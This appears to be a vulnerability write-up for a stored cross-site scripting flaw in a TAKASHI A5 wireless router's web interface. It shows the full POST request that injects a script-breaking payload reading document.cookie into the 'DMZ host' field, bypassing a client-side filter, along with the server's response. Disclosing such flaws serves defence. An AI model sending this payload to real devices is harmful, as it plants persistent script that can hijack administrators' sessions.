#TAKASHI-Wireless-Instant-Router-And-Repeater<br />
`Software version 	    V5.07.38_AAL03`<br />
`Hardware version 	    V3.0`<br />
`Model no.A5`<br />


The vulnerability lies within sanitizing user input.<br />
when a request to sent to the web application.<br />

Specifically the 'DMZ host' IP address.<br />

On the webserver the request is filtered by a javascript function that can be bypassed easily by sending the request directly leading to a XSS <br />injection. The injection is stored on the web application and is refected to any user that visits the 'DMZ Host' section of the web application.<br />

This is the request that leads to cross site scripting. the closing script<br />
closes the previous running script and we can start our own immediatly after.<br />

POST /goform/VirSerDMZ HTTP/1.1<br />
Host: `192.168.2.1`<br />
Content-Length: 56<br />
Cache-Control: max-age=0<br />
Origin: `http://192.168.2.1`<br />
DNT: 1<br />
Upgrade-Insecure-Requests: 1<br />
Content-Type: application/x-www-form-urlencoded<br />
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0<br />
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br />
Referer: `http://192.168.2.1/nat_dmz.asp`<br />
Accept-Encoding: gzip, deflate, br<br />
Accept-Language: en-US,en;q=0.9,nl;q=0.8<br />
Cookie: admin:language=LOL<br />
Connection: keep-alive<br />
<br />
GO=nat_dmz.asp&dmzip=`</script><script>alert(document.cookie);</script>`<br />
<br />

This ouputs:<br />
HTTP/1.0 302 Redirect<br />
Server: GoAhead-Webs<br />
Date: Thu Jan 01 00:53:41 1970<br />
Pragma: no-cache<br />
Cache-Control: no-cache<br />
Content-Type: text/html<br />
Location: `http://192.168.2.1`/nat_dmz.asp<br />

<html><br /><head><br /></head><br /><body><br />
		This document has moved to a new `<a href="http://192.168.2.1/nat_dmz.asp">location</a>.<br />`
		Please update your documents to reflect the new location.<br />
		</body></html><br />
<br />
JNow once that request is made, a persistant script is left on the server that will exicute any time the page is visited.
